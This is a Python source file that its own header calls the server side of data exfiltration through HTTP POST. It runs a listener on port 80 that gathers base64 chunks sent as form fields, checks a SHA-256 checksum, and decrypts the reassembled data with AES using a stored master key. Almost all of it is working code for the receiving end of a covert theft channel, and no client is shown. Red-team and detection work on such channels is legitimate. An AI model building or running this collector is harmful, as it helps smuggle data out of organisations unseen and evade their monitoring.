# 05.07.2023
# Data exfiltration thru HTTP POST.
# Server side - listen mode

import hashlib
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
from helper import FileHelper as FH
from helper import Helper as Hlp
import logging
from Crypto.Cipher import AES
from urllib.parse import unquote

#  Read config file
confData=Hlp.ReadConfigFile('config.conf')
fields=confData['Fields'].split(',')

keyfile='master.key'
logging.basicConfig(level=logging.INFO)
exfilData=[]

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself       
        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
        try:
            data=post_data.decode('utf-8').split('=')
        except:
            print('no data!')
        Recorder(data)

def Recorder(data): # record data
    if data[0] in fields:
        exfilData.append(unquote(data[1]))
    elif data[0] == confData['KeyClose']:
        exfilData.append(unquote(data[1]))
        DataJoin,CHM,KeyIV=DataManupulate(exfilData)
        if CHMCheck(DataJoin,CHM.decode()): # Check checksum
            logging.info('Checksum OK')
            key=GetKeyFromFile(keyfile)
            DecTXT=DecryptMSG(base64.b64decode(DataJoin),key,KeyIV)
            print(DecTXT)
        else:
            logging.error('Checksum not same')
        print('End Transmission')

def GetKeyFromFile(keyfileName):
    with open(keyfileName, "rb") as file1:
        fileintxt= file1.readline()
    return fileintxt

def DecryptMSG(encMsg,key,IV):
    e_cipher = AES.new(key, AES.MODE_EAX, IV)
    cipherRead= e_cipher.decrypt(encMsg).decode("ISO-8859-1")
    return cipherRead

def DataManupulate(ROWData):
    Datab64=b64decode(ROWData) # decode base64      
    DataDict=DataToDict(Datab64)  # convert to dict
    DataSort=dict(sorted(DataDict.items())) # sort dict
    KeyIV=DataDict.get(str.encode(confData['KeyOpen'])) # extract IV
    CHM=DataDict.get(str.encode(confData['KeyClose'])) # extract sha256 checksum
    DataSort.pop(str.encode(confData['KeyOpen']));DataSort.pop(str.encode(confData['KeyClose'])) # delete it from dict
    DataJoin = b''.join(DataSort.values()) # join dict 
    return DataJoin,CHM,KeyIV

def CHMCheck(DataJoin,CHM):
    h = hashlib.new('sha256')
    h.update(DataJoin) 
    if h.hexdigest()==CHM:
        return True
    else:
        return False

def DataToDict(lst:list):
    DataDict={}
    for item in lst:
        itemsplt=item.split(b'::')
        DataDict.update({itemsplt[0]:itemsplt[1]})
    return DataDict

def b64decode(txt):
    rslt=[]
    for item in txt:
        rslt.append(base64.b64decode(item))
    return rslt

def StartHttpServer(server_class=HTTPServer, handler_class=S):
    port=80
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting http server...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping http server...\n')

def main():
    StartHttpServer()

if __name__ == "__main__":
    main()
